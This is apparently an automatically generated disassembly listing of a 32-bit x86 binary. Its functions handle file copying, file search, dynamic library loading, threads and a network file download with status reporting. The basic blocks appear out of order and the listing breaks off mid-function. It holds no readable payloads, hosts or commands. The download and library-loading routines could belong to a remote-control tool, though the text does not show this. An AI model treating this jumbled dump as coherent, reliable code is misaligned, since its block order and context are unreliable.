FUNCTION NAME:cpRenameFile
TOTAL BLOCKS :2
0x804f111:	sub	esp, 0x14
0x804f114:	push	dword ptr [esp + 0x1c]
0x804f118:	push	dword ptr [esp + 0x1c]
0x804f11c:	call	0x804bdc0
None
|
|
|
v
0x804f121:	test	eax, eax
0x804f123:	sete	al
0x804f126:	add	esp, 0x1c
0x804f129:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpFileExists
TOTAL BLOCKS :2
0x804f138:	test	eax, eax
0x804f13a:	sete	al
0x804f13d:	add	esp, 0x1c
0x804f140:	ret	
None
|
|
|
v
0x804f12a:	sub	esp, 0x14
0x804f12d:	push	0
0x804f12f:	push	dword ptr [esp + 0x1c]
0x804f133:	call	0x804be90
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpDirectoryExists
TOTAL BLOCKS :4
0x804f15b:	mov	eax, dword ptr [esp + 0x10]
0x804f15f:	and	eax, 0xf000
0x804f164:	cmp	eax, 0x4000
0x804f169:	sete	dl
0x804f16c:	mov	al, dl
0x804f16e:	add	esp, 0x6c
0x804f171:	ret	
None
|
|
|
v
0x804f141:	sub	esp, 0x74
0x804f144:	lea	eax, dword ptr [esp + 8]
0x804f148:	push	eax
0x804f149:	push	dword ptr [esp + 0x7c]
0x804f14d:	call	0x8055e10
None
|
|
|
v
0x804f152:	add	esp, 0x10
0x804f155:	xor	edx, edx
0x804f157:	test	eax, eax
0x804f159:	jne	0x804f16c
None
|
|
|
v
0x804f16c:	mov	al, dl
0x804f16e:	add	esp, 0x6c
0x804f171:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpCopyFile
TOTAL BLOCKS :28
0x804f172:	push	ebp
0x804f173:	push	edi
0x804f174:	push	esi
0x804f175:	push	ebx
0x804f176:	xor	ebx, ebx
0x804f178:	sub	esp, 0x24
0x804f17b:	push	0x80560d3
0x804f180:	push	dword ptr [esp + 0x3c]
0x804f184:	call	0x804bca0
None
|
|
|
v
0x804f254:	mov	eax, dword ptr [esp + 0x30]
0x804f258:	cmp	byte ptr [eax + 0x2200], 0
0x804f25f:	je	0x804f271
None
|
|
|
v
0x804f238:	add	esp, 0x10
0x804f23b:	test	bl, bl
0x804f23d:	jne	0x804f254
None
|
|
|
v
0x804f22f:	sub	esp, 0xc
0x804f232:	push	edi
0x804f233:	call	0x804bbe0
None
|
|
|
v
0x804f20e:	sub	esp, 0xc
0x804f211:	push	esi
0x804f212:	call	0x804bbc0
None
|
|
|
v
0x804f21c:	sar	ebx, 1
0x804f21e:	dec	edx
0x804f21f:	jne	0x804f1bf
None
|
|
|
v
0x804f1eb:	test	eax, eax
0x804f1ed:	je	0x804f20c
None
|
|
|
v
0x804f271:	add	esp, 0x1c
0x804f274:	mov	al, bl
0x804f276:	pop	ebx
0x804f277:	pop	esi
0x804f278:	pop	edi
0x804f279:	pop	ebp
0x804f27a:	ret	
None
|
|
|
v
0x804f261:	sub	esp, 0xc
0x804f264:	lea	eax, dword ptr [esp + 0x3c]
0x804f268:	push	eax
0x804f269:	call	0x804f57c
None
|
|
|
v
0x804f22c:	add	esp, 0x10
0x804f22f:	sub	esp, 0xc
0x804f232:	push	edi
0x804f233:	call	0x804bbe0
None
|
|
|
v
0x804f1fd:	add	esp, 0x10
0x804f200:	mov	edx, dword ptr [esp + 0xc]
0x804f204:	cmp	edx, eax
0x804f206:	je	0x804f1d9
None
|
|
|
v
0x804f1bf:	sub	esp, 0xc
0x804f1c2:	push	ebx
0x804f1c3:	mov	dword ptr [esp + 0x1c], edx
0x804f1c7:	call	0x804bd40
None
|
|
|
v
0x804f1ef:	push	ebp
0x804f1f0:	push	eax
0x804f1f1:	push	1
0x804f1f3:	push	esi
0x804f1f4:	mov	dword ptr [esp + 0x1c], eax
0x804f1f8:	call	0x804bcb0
None
|
|
|
v
0x804f221:	xor	ebx, ebx
0x804f223:	sub	esp, 0xc
0x804f226:	push	ebp
0x804f227:	call	0x804bbe0
None
|
|
|
v
0x804f1ac:	add	esp, 0x10
0x804f1af:	test	eax, eax
0x804f1b1:	mov	ebp, eax
0x804f1b3:	je	0x804f22f
None
|
|
|
v
0x804f1d9:	push	edi
0x804f1da:	push	ebx
0x804f1db:	push	1
0x804f1dd:	push	esi
0x804f1de:	call	0x804bce0
None
|
|
|
v
0x804f23f:	sub	esp, 0xc
0x804f242:	mov	eax, dword ptr [esp + 0x3c]
0x804f246:	add	eax, 0x1100
0x804f24b:	push	eax
0x804f24c:	call	0x804f0fc
None
|
|
|
v
0x804f1e3:	add	esp, 0x10
0x804f1e6:	cmp	eax, 0xff
0x804f1e9:	je	0x804f208
None
|
|
|
v
0x804f20c:	mov	bl, 1
0x804f20e:	sub	esp, 0xc
0x804f211:	push	esi
0x804f212:	call	0x804bbc0
None
|
|
|
v
0x804f251:	add	esp, 0x10
0x804f254:	mov	eax, dword ptr [esp + 0x30]
0x804f258:	cmp	byte ptr [eax + 0x2200], 0
0x804f25f:	je	0x804f271
None
|
|
|
v
0x804f189:	add	esp, 0x10
0x804f18c:	test	eax, eax
0x804f18e:	mov	edi, eax
0x804f190:	je	0x804f271
None
|
|
|
v
0x804f217:	add	esp, 0x10
0x804f21a:	jmp	0x804f223
None
|
|
|
v
0x804f196:	push	edx
0x804f197:	push	edx
0x804f198:	push	0x80560d6
0x804f19d:	mov	eax, dword ptr [esp + 0x3c]
0x804f1a1:	add	eax, 0x1100
0x804f1a6:	push	eax
0x804f1a7:	call	0x804bca0
None
|
|
|
v
0x804f1cc:	add	esp, 0x10
0x804f1cf:	mov	edx, dword ptr [esp + 0xc]
0x804f1d3:	test	eax, eax
0x804f1d5:	mov	esi, eax
0x804f1d7:	je	0x804f21c
None
|
|
|
v
0x804f1b5:	mov	edx, 9
0x804f1ba:	mov	ebx, 0x8000
0x804f1bf:	sub	esp, 0xc
0x804f1c2:	push	ebx
0x804f1c3:	mov	dword ptr [esp + 0x1c], edx
0x804f1c7:	call	0x804bd40
None
|
|
|
v
0x804f26e:	add	esp, 0x10
0x804f271:	add	esp, 0x1c
0x804f274:	mov	al, bl
0x804f276:	pop	ebx
0x804f277:	pop	esi
0x804f278:	pop	edi
0x804f279:	pop	ebp
0x804f27a:	ret	
None
|
|
|
v
0x804f223:	sub	esp, 0xc
0x804f226:	push	ebp
0x804f227:	call	0x804bbe0
None
|
|
|
v
0x804f208:	xor	ebx, ebx
0x804f20a:	jmp	0x804f20e
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpCopyFileEx
TOTAL BLOCKS :25
0x804f319:	sar	esi, 1
0x804f31b:	dec	edi
0x804f31c:	jne	0x804f2c4
None
|
|
|
v
0x804f32f:	sub	esp, 0xc
0x804f332:	push	ebp
0x804f333:	call	0x804bbe0
None
|
|
|
v
0x804f2ba:	mov	edi, 9
0x804f2bf:	mov	esi, 0x8000
0x804f2c4:	sub	esp, 0xc
0x804f2c7:	push	esi
0x804f2c8:	call	0x804bd40
None
|
|
|
v
0x804f306:	mov	esi, 1
0x804f30b:	sub	esp, 0xc
0x804f30e:	push	ebx
0x804f30f:	call	0x804bbc0
None
|
|
|
v
0x804f27b:	push	ebp
0x804f27c:	push	edi
0x804f27d:	push	esi
0x804f27e:	xor	esi, esi
0x804f280:	push	ebx
0x804f281:	sub	esp, 0x24
0x804f284:	push	0x80560d3
0x804f289:	push	dword ptr [esp + 0x3c]
0x804f28d:	call	0x804bca0
None
|
|
|
v
0x804f2ea:	test	eax, eax
0x804f2ec:	je	0x804f306
None
|
|
|
v
0x804f341:	sub	esp, 0xc
0x804f344:	push	dword ptr [esp + 0x40]
0x804f348:	call	0x804f0fc
None
|
|
|
v
0x804f32c:	add	esp, 0x10
0x804f32f:	sub	esp, 0xc
0x804f332:	push	ebp
0x804f333:	call	0x804bbe0
None
|
|
|
v
0x804f2cd:	add	esp, 0x10
0x804f2d0:	test	eax, eax
0x804f2d2:	mov	ebx, eax
0x804f2d4:	je	0x804f319
None
|
|
|
v
0x804f338:	mov	eax, esi
0x804f33a:	add	esp, 0x10
0x804f33d:	test	al, al
0x804f33f:	jne	0x804f350
None
|
|
|
v
0x804f292:	add	esp, 0x10
0x804f295:	test	eax, eax
0x804f297:	mov	ebp, eax
0x804f299:	je	0x804f350
None
|
|
|
v
0x804f34d:	add	esp, 0x10
0x804f350:	add	esp, 0x1c
0x804f353:	mov	eax, esi
0x804f355:	pop	ebx
0x804f356:	pop	esi
0x804f357:	pop	edi
0x804f358:	pop	ebp
0x804f359:	ret	
None
|
|
|
v
0x804f31e:	xor	esi, esi
0x804f320:	sub	esp, 0xc
0x804f323:	push	dword ptr [esp + 0x18]
0x804f327:	call	0x804bbe0
None
|
|
|
v
0x804f30b:	sub	esp, 0xc
0x804f30e:	push	ebx
0x804f30f:	call	0x804bbc0
None
|
|
|
v
0x804f2af:	mov	dword ptr [esp + 0x1c], eax
0x804f2b3:	add	esp, 0x10
0x804f2b6:	test	eax, eax
0x804f2b8:	je	0x804f32f
None
|
|
|
v
0x804f314:	add	esp, 0x10
0x804f317:	jmp	0x804f320
None
|
|
|
v
0x804f2c4:	sub	esp, 0xc
0x804f2c7:	push	esi
0x804f2c8:	call	0x804bd40
None
|
|
|
v
0x804f350:	add	esp, 0x1c
0x804f353:	mov	eax, esi
0x804f355:	pop	ebx
0x804f356:	pop	esi
0x804f357:	pop	edi
0x804f358:	pop	ebp
0x804f359:	ret	
None
|
|
|
v
0x804f2fb:	add	esp, 0x10
0x804f2fe:	cmp	edi, eax
0x804f300:	je	0x804f2d6
None
|
|
|
v
0x804f29f:	push	ecx
0x804f2a0:	push	ecx
0x804f2a1:	push	0x80560d6
0x804f2a6:	push	dword ptr [esp + 0x40]
0x804f2aa:	call	0x804bca0
None
|
|
|
v
0x804f2ee:	push	dword ptr [esp + 0xc]
0x804f2f2:	push	eax
0x804f2f3:	push	1
0x804f2f5:	push	ebx
0x804f2f6:	call	0x804bcb0
None
|
|
|
v
0x804f320:	sub	esp, 0xc
0x804f323:	push	dword ptr [esp + 0x18]
0x804f327:	call	0x804bbe0
None
|
|
|
v
0x804f2e0:	add	esp, 0x10
0x804f2e3:	cmp	eax, 0xff
0x804f2e6:	mov	edi, eax
0x804f2e8:	je	0x804f302
None
|
|
|
v
0x804f2d6:	push	ebp
0x804f2d7:	push	esi
0x804f2d8:	push	1
0x804f2da:	push	ebx
0x804f2db:	call	0x804bce0
None
|
|
|
v
0x804f302:	xor	esi, esi
0x804f304:	jmp	0x804f30b
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpGetFileSize
TOTAL BLOCKS :4
0x804f381:	add	esp, 0x6c
0x804f384:	ret	
None
|
|
|
v
0x804f36b:	add	esp, 0x10
0x804f36e:	mov	ecx, eax
0x804f370:	or	eax, 0xffffffff
0x804f373:	test	ecx, ecx
0x804f375:	mov	edx, eax
0x804f377:	jne	0x804f381
None
|
|
|
v
0x804f35a:	sub	esp, 0x74
0x804f35d:	lea	eax, dword ptr [esp + 8]
0x804f361:	push	eax
0x804f362:	push	dword ptr [esp + 0x7c]
0x804f366:	call	0x8055e10
None
|
|
|
v
0x804f379:	mov	eax, dword ptr [esp + 0x2c]
0x804f37d:	mov	edx, dword ptr [esp + 0x30]
0x804f381:	add	esp, 0x6c
0x804f384:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpMkDir
TOTAL BLOCKS :2
0x804f385:	sub	esp, 0x14
0x804f388:	push	0x1ff
0x804f38d:	push	dword ptr [esp + 0x1c]
0x804f391:	call	0x804be30
None
|
|
|
v
0x804f396:	add	esp, 0x1c
0x804f399:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:FindFile
TOTAL BLOCKS :24
0x804f493:	add	esp, 0x6c
0x804f496:	pop	ebx
0x804f497:	pop	esi
0x804f498:	pop	edi
0x804f499:	pop	ebp
0x804f49a:	ret	
None
|
|
|
v
0x804f3d1:	jmp	0x804f493
None
|
|
|
v
0x804f429:	cmp	dword ptr [esp + 0x88], 0x8000
0x804f434:	jne	0x804f456
None
|
|
|
v
0x804f48e:	add	esp, 0x10
0x804f491:	xor	eax, eax
0x804f493:	add	esp, 0x6c
0x804f496:	pop	ebx
0x804f497:	pop	esi
0x804f498:	pop	edi
0x804f499:	pop	ebp
0x804f49a:	ret	
None
|
|
|
v
0x804f46f:	add	esp, 0x10
0x804f472:	test	eax, eax
0x804f474:	jne	0x804f3d6
None
|
|
|
v
0x804f486:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x804f416:	add	esp, 0x10
0x804f419:	inc	eax
0x804f41a:	je	0x804f466
None
|
|
|
v
0x804f408:	add	esp, 0x18
0x804f40b:	lea	eax, dword ptr [esp + 8]
0x804f40f:	push	eax
0x804f410:	push	esi
0x804f411:	call	0x8055e50
None
|
|
|
v
0x804f45f:	add	esp, 0x10
0x804f462:	mov	al, 1
0x804f464:	jmp	0x804f493
None
|
|
|
v
0x804f3ef:	push	eax
0x804f3f0:	push	edi
0x804f3f1:	push	ebp
0x804f3f2:	push	0x80560cd
0x804f3f7:	push	-1
0x804f3f9:	push	1
0x804f3fb:	push	dword ptr [esp + 0xa8]
0x804f402:	push	esi
0x804f403:	call	0x804bb70
None
|
|
|
v
0x804f454:	jne	0x804f466
None
|
|
|
v
0x804f3ba:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x804f3d6:	lea	edi, dword ptr [eax + 0x13]
0x804f3d9:	push	eax
0x804f3da:	push	eax
0x804f3db:	push	edi
0x804f3dc:	push	dword ptr [esp + 0x90]
0x804f3e3:	call	0x80520a8
None
|
|
|
v
0x804f3e8:	add	esp, 0x10
0x804f3eb:	test	al, al
0x804f3ed:	je	0x804f466
None
|
|
|
v
0x804f41c:	cmp	dword ptr [esp + 0x88], 0x4000
0x804f427:	je	0x804f446
None
|
|
|
v
0x804f488:	push	ebx
0x804f489:	call	0x804bfc0
None
|
|
|
v
0x804f446:	mov	eax, dword ptr [esp + 0x10]
0x804f44a:	and	eax, 0xf000
0x804f44f:	cmp	eax, 0x4000
0x804f454:	jne	0x804f466
None
|
|
|
v
0x804f436:	mov	eax, dword ptr [esp + 0x10]
0x804f43a:	and	eax, 0xf000
0x804f43f:	cmp	eax, 0x8000
0x804f444:	jmp	0x804f454
None
|
|
|
v
0x804f3c2:	add	esp, 0x10
0x804f3c5:	mov	ebx, eax
0x804f3c7:	xor	eax, eax
0x804f3c9:	test	ebx, ebx
0x804f3cb:	jne	0x804f466
None
|
|
|
v
0x804f456:	sub	esp, 0xc
0x804f459:	push	ebx
0x804f45a:	call	0x804bfc0
None
|
|
|
v
0x804f3bc:	push	ebp
0x804f3bd:	call	0x804bfd0
None
|
|
|
v
0x804f466:	sub	esp, 0xc
0x804f469:	push	ebx
0x804f46a:	call	0x804bef0
None
|
|
|
v
0x804f47a:	mov	ecx, dword ptr [esp + 0x90]
0x804f481:	mov	edi, esi
0x804f483:	sub	esp, 0xc
0x804f486:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x804f39a:	push	ebp
0x804f39b:	xor	eax, eax
0x804f39d:	push	edi
0x804f39e:	push	esi
0x804f39f:	push	ebx
0x804f3a0:	sub	esp, 0x78
0x804f3a3:	mov	esi, dword ptr [esp + 0x98]
0x804f3aa:	mov	ecx, dword ptr [esp + 0x9c]
0x804f3b1:	mov	ebp, dword ptr [esp + 0x8c]
0x804f3b8:	mov	edi, esi
0x804f3ba:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpGetLocalFileName
TOTAL BLOCKS :10
0x804f4f1:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x804f4b7:	push	edx
0x804f4b8:	push	edx
0x804f4b9:	push	eax
0x804f4ba:	push	0x80560d9
0x804f4bf:	push	0x1100
0x804f4c4:	push	1
0x804f4c6:	push	0x1100
0x804f4cb:	lea	edi, dword ptr [esp + 0x1c]
0x804f4cf:	push	edi
0x804f4d0:	call	0x804bb70
None
|
|
|
v
0x804f4eb:	xor	eax, eax
0x804f4ed:	mov	edi, ebx
0x804f4ef:	mov	ecx, esi
0x804f4f1:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x804f4fb:	add	esp, 0x1100
0x804f501:	pop	ebx
0x804f502:	pop	esi
0x804f503:	pop	edi
0x804f504:	ret	
None
|
|
|
v
0x804f4e0:	add	esp, 0x10
0x804f4e3:	cmp	eax, esi
0x804f4e5:	jge	0x804f4eb
None
|
|
|
v
0x804f4e7:	test	eax, eax
0x804f4e9:	jg	0x804f4f5
None
|
|
|
v
0x804f4f3:	jmp	0x804f4fb
None
|
|
|
v
0x804f4f5:	mov	byte ptr [ebx + eax], 0
0x804f4f9:	mov	al, 1
0x804f4fb:	add	esp, 0x1100
0x804f501:	pop	ebx
0x804f502:	pop	esi
0x804f503:	pop	edi
0x804f504:	ret	
None
|
|
|
v
0x804f4d5:	add	esp, 0x1c
0x804f4d8:	push	esi
0x804f4d9:	push	ebx
0x804f4da:	push	edi
0x804f4db:	call	0x804bc80
None
|
|
|
v
0x804f49b:	push	edi
0x804f49c:	push	esi
0x804f49d:	push	ebx
0x804f49e:	sub	esp, 0x1100
0x804f4a4:	mov	esi, dword ptr [esp + 0x1114]
0x804f4ab:	mov	ebx, dword ptr [esp + 0x1110]
0x804f4b2:	call	0x804fdc2
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpGetLocalFilePath
TOTAL BLOCKS :5
0x804f505:	push	ebx
0x804f506:	sub	esp, 0x1010
0x804f50c:	push	0x1000
0x804f511:	lea	ebx, dword ptr [esp + 0xc]
0x804f515:	push	ebx
0x804f516:	call	0x804f49b
None
|
|
|
v
0x804f524:	push	ecx
0x804f525:	push	dword ptr [esp + 0x1018]
0x804f52c:	push	dword ptr [esp + 0x1018]
0x804f533:	push	ebx
0x804f534:	call	0x8052276
None
|
|
|
v
0x804f539:	add	esp, 0x10
0x804f53c:	mov	dl, 1
0x804f53e:	add	esp, 0x1008
0x804f544:	mov	al, dl
0x804f546:	pop	ebx
0x804f547:	ret	
None
|
|
|
v
0x804f51b:	add	esp, 0x10
0x804f51e:	xor	edx, edx
0x804f520:	test	al, al
0x804f522:	je	0x804f53e
None
|
|
|
v
0x804f53e:	add	esp, 0x1008
0x804f544:	mov	al, dl
0x804f546:	pop	ebx
0x804f547:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpSleep
TOTAL BLOCKS :1
0x804f548:	imul	eax, dword ptr [esp + 4], 0x3e8
0x804f550:	mov	dword ptr [esp + 4], eax
0x804f554:	jmp	0x804bcd0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpBeginThread
TOTAL BLOCKS :2
0x804f570:	test	eax, eax
0x804f572:	sete	al
0x804f575:	add	esp, 0x2c
0x804f578:	movzx	eax, al
0x804f57b:	ret	
None
|
|
|
v
0x804f559:	sub	esp, 0x1c
0x804f55c:	push	dword ptr [esp + 0x24]
0x804f560:	push	dword ptr [esp + 0x24]
0x804f564:	push	0
0x804f566:	lea	eax, dword ptr [esp + 0x18]
0x804f56a:	push	eax
0x804f56b:	call	0x804bf20
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ReleaseHeap
TOTAL BLOCKS :4
0x804f596:	mov	dword ptr [ebx], 0
0x804f59c:	add	esp, 8
0x804f59f:	pop	ebx
0x804f5a0:	ret	
None
|
|
|
v
0x804f57c:	push	ebx
0x804f57d:	sub	esp, 8
0x804f580:	mov	ebx, dword ptr [esp + 0x10]
0x804f584:	mov	eax, dword ptr [ebx]
0x804f586:	test	eax, eax
0x804f588:	je	0x804f596
None
|
|
|
v
0x804f58a:	sub	esp, 0xc
0x804f58d:	push	eax
0x804f58e:	call	0x804bbc0
None
|
|
|
v
0x804f593:	add	esp, 0x10
0x804f596:	mov	dword ptr [ebx], 0
0x804f59c:	add	esp, 8
0x804f59f:	pop	ebx
0x804f5a0:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpReadFileData
TOTAL BLOCKS :23
0x804f5a1:	push	edi
0x804f5a2:	push	esi
0x804f5a3:	push	ebx
0x804f5a4:	sub	esp, 0x10
0x804f5a7:	mov	esi, dword ptr [esp + 0x24]
0x804f5ab:	mov	dword ptr [esp + 8], 0
0x804f5b3:	test	esi, esi
0x804f5b5:	jne	0x804f5bb
None
|
|
|
v
0x804f670:	add	esp, 0x10
0x804f673:	cmp	dword ptr [esp + 0xc], 0
0x804f678:	je	0x804f68a
None
|
|
|
v
0x804f611:	add	esp, 0x10
0x804f614:	test	eax, eax
0x804f616:	jne	0x804f665
None
|
|
|
v
0x804f687:	add	esp, 0x10
0x804f68a:	add	esp, 0x10
0x804f68d:	mov	eax, edi
0x804f68f:	pop	ebx
0x804f690:	pop	esi
0x804f691:	pop	edi
0x804f692:	ret	
None
|
|
|
v
0x804f622:	mov	dword ptr [esp + 0x1c], eax
0x804f626:	add	esp, 0x10
0x804f629:	test	eax, eax
0x804f62b:	je	0x804f665
None
|
|
|
v
0x804f65f:	mov	edi, dword ptr [esp + 0x1c]
0x804f663:	jmp	0x804f687
None
|
|
|
v
0x804f5ed:	add	esp, 0x10
0x804f5f0:	test	eax, eax
0x804f5f2:	jne	0x804f665
None
|
|
|
v
0x804f5f4:	sub	esp, 0xc
0x804f5f7:	push	ebx
0x804f5f8:	call	0x804be10
None
|
|
|
v
0x804f5bb:	mov	dword ptr [esp + 0xc], 0
0x804f5c3:	xor	edi, edi
0x804f5c5:	push	eax
0x804f5c6:	push	eax
0x804f5c7:	push	0x80560d3
0x804f5cc:	push	dword ptr [esp + 0x2c]
0x804f5d0:	call	0x804bca0
None
|
|
|
v
0x804f641:	push	eax
0x804f642:	push	eax
0x804f643:	push	edi
0x804f644:	push	dword ptr [esp + 0x18]
0x804f648:	call	0x804bd30
None
|
|
|
v
0x804f665:	sub	esp, 0xc
0x804f668:	xor	edi, edi
0x804f66a:	push	ebx
0x804f66b:	call	0x804bbe0
None
|
|
|
v
0x804f64d:	mov	dword ptr [esi], edi
0x804f64f:	mov	dword ptr [esp + 0x1c], eax
0x804f653:	add	esp, 0x10
0x804f656:	sub	esp, 0xc
0x804f659:	push	ebx
0x804f65a:	call	0x804bbe0
None
|
|
|
v
0x804f67a:	sub	esp, 0xc
0x804f67d:	lea	eax, dword ptr [esp + 0x18]
0x804f681:	push	eax
0x804f682:	call	0x804f57c
None
|
|
|
v
0x804f618:	sub	esp, 0xc
0x804f61b:	push	dword ptr [esi]
0x804f61d:	call	0x804bd40
None
|
|
|
v
0x804f68a:	add	esp, 0x10
0x804f68d:	mov	eax, edi
0x804f68f:	pop	ebx
0x804f690:	pop	esi
0x804f691:	pop	edi
0x804f692:	ret	
None
|
|
|
v
0x804f638:	add	esp, 0x10
0x804f63b:	cmp	eax, dword ptr [esi]
0x804f63d:	mov	edi, eax
0x804f63f:	je	0x804f656
None
|
|
|
v
0x804f5b7:	lea	esi, dword ptr [esp + 8]
0x804f5bb:	mov	dword ptr [esp + 0xc], 0
0x804f5c3:	xor	edi, edi
0x804f5c5:	push	eax
0x804f5c6:	push	eax
0x804f5c7:	push	0x80560d3
0x804f5cc:	push	dword ptr [esp + 0x2c]
0x804f5d0:	call	0x804bca0
None
|
|
|
v
0x804f606:	push	eax
0x804f607:	push	0
0x804f609:	push	0
0x804f60b:	push	ebx
0x804f60c:	call	0x804bc90
None
|
|
|
v
0x804f5e2:	push	eax
0x804f5e3:	push	2
0x804f5e5:	push	0
0x804f5e7:	push	ebx
0x804f5e8:	call	0x804bc90
None
|
|
|
v
0x804f656:	sub	esp, 0xc
0x804f659:	push	ebx
0x804f65a:	call	0x804bbe0
None
|
|
|
v
0x804f5d5:	add	esp, 0x10
0x804f5d8:	test	eax, eax
0x804f5da:	mov	ebx, eax
0x804f5dc:	je	0x804f68a
None
|
|
|
v
0x804f62d:	push	ebx
0x804f62e:	push	dword ptr [esi]
0x804f630:	push	1
0x804f632:	push	eax
0x804f633:	call	0x804bce0
None
|
|
|
v
0x804f5fd:	add	esp, 0x10
0x804f600:	test	eax, eax
0x804f602:	mov	dword ptr [esi], eax
0x804f604:	jle	0x804f665
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpLoadLibrary
TOTAL BLOCKS :2
0x804f6a1:	add	esp, 0x1c
0x804f6a4:	ret	
None
|
|
|
v
0x804f693:	sub	esp, 0x14
0x804f696:	push	1
0x804f698:	push	dword ptr [esp + 0x1c]
0x804f69c:	call	0x804bf00
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpGetProcAddress
TOTAL BLOCKS :1
0x804f6a5:	jmp	0x804be00
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpFreeLibrary
TOTAL BLOCKS :3
0x804f6aa:	mov	eax, dword ptr [esp + 4]
0x804f6ae:	test	eax, eax
0x804f6b0:	je	0x804f6b7
None
|
|
|
v
0x804f6b2:	jmp	0x804bc50
None
|
|
|
v
0x804f6b7:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:SendDownloadStatus
TOTAL BLOCKS :7
0x804f6b8:	push	esi
0x804f6b9:	push	ebx
0x804f6ba:	sub	esp, 0x14
0x804f6bd:	mov	ebx, dword ptr [esp + 0x20]
0x804f6c1:	cmp	dword ptr [ebx + 0x330c], 0
0x804f6c8:	je	0x804f721
None
|
|
|
v
0x804f704:	push	eax
0x804f705:	push	dword ptr [esp + 0x10]
0x804f709:	push	0x2a
0x804f70b:	push	dword ptr [ebx + 0x330c]
0x804f711:	call	0x804e62a
None
|
|
|
v
0x804f71e:	add	esp, 0x10
0x804f721:	add	esp, 0x14
0x804f724:	pop	ebx
0x804f725:	pop	esi
0x804f726:	ret	
None
|
|
|
v
0x804f6fc:	add	esp, 0x20
0x804f6ff:	cmp	eax, 0xff
0x804f702:	je	0x804f721
None
|
|
|
v
0x804f721:	add	esp, 0x14
0x804f724:	pop	ebx
0x804f725:	pop	esi
0x804f726:	ret	
None
|
|
|
v
0x804f716:	mov	dword ptr [esp], esi
0x804f719:	call	0x804f57c
None
|
|
|
v
0x804f6ca:	lea	eax, dword ptr [ebx + 0x2200]
0x804f6d0:	mov	dword ptr [esp + 0xc], 0
0x804f6d8:	push	eax
0x804f6d9:	push	ebx
0x804f6da:	lea	eax, dword ptr [ebx + 0x1100]
0x804f6e0:	push	eax
0x804f6e1:	push	dword ptr [esp + 0x30]
0x804f6e5:	push	dword ptr [ebx + 0x3308]
0x804f6eb:	push	0x80560e6
0x804f6f0:	push	1
0x804f6f2:	lea	esi, dword ptr [esp + 0x28]
0x804f6f6:	push	esi
0x804f6f7:	call	0x804bd20
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpDownloadFile
TOTAL BLOCKS :48
0x804f995:	pop	eax
0x804f996:	lea	eax, dword ptr [esp + 0x828]
0x804f99d:	push	eax
0x804f99e:	call	0x804e827
None
|
|
|
v
0x804f9d0:	add	esp, 0x10
0x804f9d3:	mov	al, 1
0x804f9d5:	add	esp, 0x82c
0x804f9db:	pop	ebx
0x804f9dc:	pop	esi
0x804f9dd:	pop	edi
0x804f9de:	pop	ebp
0x804f9df:	ret	
None
|
|
|
v
0x804f75e:	add	esp, 0xc
0x804f761:	push	0
0x804f763:	push	1
0x804f765:	push	2
0x804f767:	call	0x804bf10
None
|
|
|
v
0x804f790:	push	eax
0x804f791:	push	eax
0x804f792:	push	1
0x804f794:	jmp	0x804f976
None
|
|
|
v
0x804f8f7:	add	esp, 0x10
0x804f8fa:	jmp	0x804f927
None
|
|
|
v
0x804f972:	push	ecx
0x804f973:	push	ecx
0x804f974:	push	3
0x804f976:	push	dword ptr [esp + 0x84c]
0x804f97d:	call	0x804f6b8
None
|
|
|
v
0x804f8af:	add	esp, 0x10
0x804f8b2:	inc	eax
0x804f8b3:	jne	0x804f8e6
None
|
|
|
v
0x804f7ab:	mov	word ptr [esp + 0x80c], 2
0x804f7b5:	mov	eax, dword ptr [edx + 0x10]
0x804f7b8:	mov	eax, dword ptr [eax]
0x804f7ba:	mov	eax, dword ptr [eax]
0x804f7bc:	mov	dword ptr [esp + 0x810], eax
0x804f7c3:	mov	eax, dword ptr [esp + 0x840]
0x804f7ca:	mov	eax, dword ptr [eax + 0x3304]
0x804f7d0:	ror	ax, 8
0x804f7d4:	mov	word ptr [esp + 0x80e], ax
0x804f7dc:	push	ebp
0x804f7dd:	push	0x10
0x804f7df:	push	ebx
0x804f7e0:	push	dword ptr [esp + 0x828]
0x804f7e7:	call	0x804bf80
None
|
|
|
v
0x804f9d5:	add	esp, 0x82c
0x804f9db:	pop	ebx
0x804f9dc:	pop	esi
0x804f9dd:	pop	edi
0x804f9de:	pop	ebp
0x804f9df:	ret	
None
|
|
|
v
0x804f925:	jmp	0x804f982
None
|
|
|
v
0x804f982:	add	esp, 0x10
0x804f985:	sub	esp, 0xc
0x804f988:	lea	eax, dword ptr [esp + 0x84c]
0x804f98f:	push	eax
0x804f990:	call	0x804f57c
None
|
|
|
v
0x804f91d:	mov	dword ptr [esp], esi
0x804f920:	call	0x804bbe0
None
|
|
|
v
0x804f9bd:	add	esp, 0x10
0x804f9c0:	sub	esp, 0xc
